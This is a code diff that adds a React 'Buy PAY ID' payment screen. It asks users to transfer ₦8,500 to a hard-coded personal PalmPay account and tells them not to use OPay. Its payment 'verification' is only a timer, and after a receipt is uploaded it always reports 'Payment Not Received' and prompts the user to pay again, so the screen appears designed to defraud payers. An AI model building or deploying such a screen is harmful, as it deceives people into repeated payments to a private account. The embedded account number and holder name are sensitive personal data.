@@ -1,0 +1,447 @@
+"use client"
+
+import type React from "react"
+
+import { Button } from "@/components/ui/button"
+import { ArrowLeft, Volume2, Upload, CheckCircle, Copy } from "lucide-react"
+import { useState, useRef } from "react"
+import Image from "next/image"
+
+interface BuyPayIdScreenProps {
+  userName: string
+  userEmail: string
+  onBack: () => void
+}
+
+export default function BuyPayIdScreen({ userName, userEmail, onBack }: BuyPayIdScreenProps) {
+  const [isProcessing, setIsProcessing] = useState(false)
+  const [showMessage, setShowMessage] = useState(false)
+  const [showWarning, setShowWarning] = useState(false)
+  const [isUnderstanding, setIsUnderstanding] = useState(false)
+  const [showPaymentPage, setShowPaymentPage] = useState(false)
+  const [showPaymentDetails, setShowPaymentDetails] = useState(false)
+  const [uploadedReceipt, setUploadedReceipt] = useState<File | null>(null)
+  const [isSubmittingPayment, setIsSubmittingPayment] = useState(false)
+  const [showPaymentNotReceived, setShowPaymentNotReceived] = useState(false)
+  const [copiedField, setCopiedField] = useState<string | null>(null)
+  const fileInputRef = useRef<HTMLInputElement>(null)
+  const audioRef = useRef<HTMLAudioElement>(null)
+
+  const paymentDetails = {
+    bankName: "PALMPAY",
+    accountNumber: "8998790636",
+    accountName: "ELOM CYNTHIA OBIANUJU",
+  }
+
+  const handlePay = () => {
+    setIsProcessing(true)
+    setShowMessage(true)
+
+    setTimeout(() => {
+      setIsProcessing(false)
+      setShowMessage(false)
+      setShowWarning(true)
+    }, 6000)
+  }
+
+  const playVoiceNote = () => {
+    if ("speechSynthesis" in window) {
+      const utterance = new SpeechSynthesisUtterance(
+        "OPay Bank is highly prohibited for making payment, and you should either use POS TERMINAL or other bank account.",
+      )
+      utterance.rate = 0.8
+      utterance.pitch = 1
+      speechSynthesis.speak(utterance)
+    }
+  }
+
+  const handleUnderstand = () => {
+    setIsUnderstanding(true)
+
+    setTimeout(() => {
+      setIsUnderstanding(false)
+      setShowWarning(false)
+      setShowPaymentDetails(true)
+    }, 6000)
+  }
+
+  const handleCopy = (text: string, field: string) => {
+    navigator.clipboard.writeText(text)
+    setCopiedField(field)
+    setTimeout(() => setCopiedField(null), 2000)
+  }
+
+  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0]
+    if (file) {
+      setUploadedReceipt(file)
+    }
+  }
+
+  const handleMadePayment = () => {
+    setIsSubmittingPayment(true)
+
+    setTimeout(() => {
+      setIsSubmittingPayment(false)
+      setShowPaymentDetails(false)
+      setShowPaymentNotReceived(true)
+    }, 6000)
+  }
+
+  const handleResubmit = () => {
+    setUploadedReceipt(null)
+    setShowPaymentNotReceived(false)
+    setShowPaymentDetails(true)
+  }
+
+  if (showPaymentNotReceived) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
+        <div className="bg-gradient-to-r from-orange-600 to-orange-700 px-4 py-6">
+          <div className="flex items-center space-x-4 mb-4">
+            <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-orange-500">
+              <ArrowLeft className="h-5 w-5" />
+            </Button>
+            <h1 className="text-white text-xl font-semibold">Payment Status</h1>
+          </div>
+        </div>
+
+        <div className="px-4 py-8">
+          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
+            <div className="text-center mb-6">
+              <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <div className="text-2xl">⏳</div>
+              </div>
+              <h2 className="text-orange-600 text-xl font-bold mb-2">Payment Not Received</h2>
+              <p className="text-gray-600 text-sm">
+                We haven't received your payment yet. Please check your transaction and try again.
+              </p>
+            </div>
+
+            <div className="bg-orange-50 border border-orange-200 rounded-lg p-4 mb-6">
+              <h3 className="font-semibold text-orange-800 mb-2">What to do next:</h3>
+              <ul className="text-sm text-orange-700 space-y-1">
+                <li>• Check if payment was successful from your bank</li>
+                <li>• Ensure you sent the exact amount: ₦8,500.00</li>
+                <li>• Upload a clear screenshot of your receipt</li>
+                <li>• Contact support if payment was successful</li>
+              </ul>
+            </div>
+
+            <div className="space-y-3">
+              <Button onClick={handleResubmit} className="w-full bg-purple-600 hover:bg-purple-700 text-white">
+                Resubmit Payment
+              </Button>
+
+              <Button
+                onClick={onBack}
+                variant="outline"
+                className="w-full border-gray-300 text-gray-700 hover:bg-gray-50 bg-transparent"
+              >
+                Back to Dashboard
+              </Button>
+            </div>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  if (showPaymentDetails) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
+        <div className="bg-gradient-to-r from-green-600 to-green-700 px-4 py-6">
+          <div className="flex items-center space-x-4 mb-4">
+            <Button
+              onClick={() => setShowPaymentDetails(false)}
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-green-500"
+            >
+              <ArrowLeft className="h-5 w-5" />
+            </Button>
+            <h1 className="text-white text-xl font-semibold">Complete Payment</h1>
+          </div>
+        </div>
+
+        <div className="px-4 py-8">
+          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
+            <h2 className="text-gray-800 text-lg font-semibold mb-6 text-center">Payment Instructions</h2>
+
+            {/* Account Details */}
+            <div className="space-y-4 mb-6">
+              <div className="bg-gray-50 rounded-2xl p-4">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-sm text-gray-600">Bank Name</p>
+                    <p className="font-bold text-gray-800">{paymentDetails.bankName}</p>
+                  </div>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => handleCopy(paymentDetails.bankName, "bank")}
+                    className="text-purple-600 hover:bg-purple-50"
+                  >
+                    {copiedField === "bank" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                  </Button>
+                </div>
+              </div>
+
+              <div className="bg-gray-50 rounded-2xl p-4">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-sm text-gray-600">Account Number</p>
+                    <p className="font-bold text-gray-800 font-mono">{paymentDetails.accountNumber}</p>
+                  </div>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => handleCopy(paymentDetails.accountNumber, "account")}
+                    className="text-purple-600 hover:bg-purple-50"
+                  >
+                    {copiedField === "account" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                  </Button>
+                </div>
+              </div>
+
+              <div className="bg-gray-50 rounded-2xl p-4">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-sm text-gray-600">Account Name</p>
+                    <p className="font-bold text-gray-800">{paymentDetails.accountName}</p>
+                  </div>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => handleCopy(paymentDetails.accountName, "name")}
+                    className="text-purple-600 hover:bg-purple-50"
+                  >
+                    {copiedField === "name" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                  </Button>
+                </div>
+              </div>
+
+              <div className="bg-purple-50 rounded-2xl p-4 border border-purple-200">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-sm text-purple-600">Amount to Pay</p>
+                    <p className="font-bold text-purple-800 text-xl">₦8,500.00</p>
+                  </div>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => handleCopy("8500", "amount")}
+                    className="text-purple-600 hover:bg-purple-100"
+                  >
+                    {copiedField === "amount" ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
+                  </Button>
+                </div>
+              </div>
+            </div>
+
+            {/* Receipt Upload */}
+            <div className="mb-6">
+              <label className="block text-sm font-medium text-gray-700 mb-2">Upload Payment Receipt</label>
+              <div
+                onClick={() => fileInputRef.current?.click()}
+                className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center cursor-pointer hover:border-purple-400 hover:bg-purple-50 transition-colors"
+              >
+                <input ref={fileInputRef} type="file" accept="image/*" onChange={handleFileUpload} className="hidden" />
+                {uploadedReceipt ? (
+                  <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <CheckCircle className="h-5 w-5" />
+                    <span className="text-sm font-medium">{uploadedReceipt.name}</span>
+                  </div>
+                ) : (
+                  <div>
+                    <Upload className="h-8 w-8 text-gray-400 mx-auto mb-2" />
+                    <p className="text-sm text-gray-600">Click to upload receipt</p>
+                    <p className="text-xs text-gray-500 mt-1">PNG, JPG up to 10MB</p>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {isSubmittingPayment && (
+              <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+                <div className="flex items-center justify-center space-x-2">
+                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
+                  <span className="text-blue-800 text-sm">Verifying payment...</span>
+                </div>
+              </div>
+            )}
+
+            <Button
+              onClick={handleMadePayment}
+              disabled={!uploadedReceipt || isSubmittingPayment}
+              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white py-3 rounded-lg font-semibold"
+            >
+              {isSubmittingPayment ? "Verifying..." : "I'VE MADE PAYMENT"}
+            </Button>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  if (showPaymentPage) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
+        <div className="bg-gradient-to-r from-purple-600 to-purple-700 px-4 py-6">
+          <div className="flex items-center space-x-4 mb-4">
+            <Button
+              onClick={() => setShowPaymentPage(false)}
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-purple-500"
+            >
+              <ArrowLeft className="h-5 w-5" />
+            </Button>
+            <h1 className="text-white text-xl font-semibold">Select Payment Method</h1>
+          </div>
+        </div>
+
+        <div className="px-4 py-8">
+          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
+            <h2 className="text-gray-800 text-lg font-semibold mb-6 text-center">Choose Your Bank</h2>
+
+            <div className="space-y-3">
+              {["Access Bank", "First Bank", "GTBank", "Zenith Bank", "Kuda", "Moniepoint", "Palmpay"].map((bank) => (
+                <Button
+                  key={bank}
+                  variant="outline"
+                  className="w-full justify-start p-4 h-auto border-2 hover:border-purple-500 hover:bg-purple-50 bg-transparent"
+                >
+                  <span className="text-gray-700 font-medium">{bank}</span>
+                </Button>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  if (showWarning) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
+        <div className="bg-gradient-to-r from-red-600 to-red-700 px-4 py-6">
+          <div className="flex items-center space-x-4 mb-4">
+            <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-red-500">
+              <ArrowLeft className="h-5 w-5" />
+            </Button>
+            <h1 className="text-white text-xl font-semibold">Payment Warning</h1>
+          </div>
+        </div>
+
+        <div className="px-4 py-8">
+          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
+            <div className="text-center mb-6">
+              <div className="w-20 h-20 mx-auto mb-4 relative">
+                <Image src="/opay-logo.png" alt="OPay Logo" fill className="object-contain" />
+              </div>
+              <div className="text-4xl mb-4">🚫</div>
+              <h2 className="text-red-600 text-xl font-bold mb-4">Important Notice</h2>
+            </div>
+
+            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
+              <p className="text-red-800 text-center font-medium">
+                OPay Bank is highly prohibited for making payment, and you should either use POS TERMINAL or other bank
+                account.
+              </p>
+            </div>
+
+            <div className="flex justify-center mb-6">
+              <Button
+                onClick={playVoiceNote}
+                variant="outline"
+                className="flex items-center space-x-2 border-purple-300 text-purple-600 hover:bg-purple-50 bg-transparent"
+              >
+                <Volume2 className="h-4 w-4" />
+                <span>🎵 Listen to Voice Note</span>
+              </Button>
+            </div>
+
+            {isUnderstanding && (
+              <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+                <div className="flex items-center justify-center space-x-2">
+                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
+                  <span className="text-blue-800 text-sm">Processing your understanding...</span>
+                </div>
+              </div>
+            )}
+
+            <Button
+              onClick={handleUnderstand}
+              disabled={isUnderstanding}
+              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white py-3 rounded-lg font-semibold"
+            >
+              {isUnderstanding ? "Processing..." : "I UNDERSTAND"}
+            </Button>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-purple-50 to-orange-50">
+      {/* Header */}
+      <div className="bg-gradient-to-r from-purple-600 to-purple-700 px-4 py-6">
+        <div className="flex items-center space-x-4 mb-4">
+          <Button onClick={onBack} variant="ghost" size="icon" className="text-white hover:bg-purple-500">
+            <ArrowLeft className="h-5 w-5" />
+          </Button>
+          <h1 className="text-white text-xl font-semibold">Buy PAY ID</h1>
+        </div>
+      </div>
+
+      {/* Content */}
+      <div className="px-4 py-8">
+        <div className="bg-white rounded-2xl p-6 shadow-lg max-w-md mx-auto">
+          <h2 className="text-gray-800 text-lg font-semibold mb-6 text-center">Payment Details</h2>
+
+          <div className="space-y-4 mb-8">
+            <div>
+              <label className="text-gray-600 text-sm font-medium">User Name</label>
+              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
+                <span className="text-gray-800">{userName}</span>
+              </div>
+            </div>
+
+            <div>
+              <label className="text-gray-600 text-sm font-medium">Email</label>
+              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
+                <span className="text-gray-800">{userEmail}</span>
+              </div>
+            </div>
+
+            <div>
+              <label className="text-gray-600 text-sm font-medium">Amount</label>
+              <div className="mt-1 p-3 bg-gray-50 rounded-lg border">
+                <span className="text-gray-800 font-semibold">₦8,500.00</span>
+              </div>
+            </div>
+          </div>
+
+          {showMessage && (
+            <div className="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+              <div className="flex items-center space-x-2">
+                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
+                <span className="text-blue-800 text-sm">Preparing Payment Account...</span>
+              </div>
+            </div>
+          )}
+
+          <Button
+            onClick={handlePay}
+            disabled={isProcessing}
+            className="w-full bg-gradient-to-r from-purple-600 to-orange-500 hover:from-purple-700 hover:to-orange-600 text-white py-3 rounded-lg font-semibold"
+          >
+            {isProcessing ? "Processing..." : "PAY"}
+          </Button>
+        </div>
+      </div>
+    </div>
+  )
+}
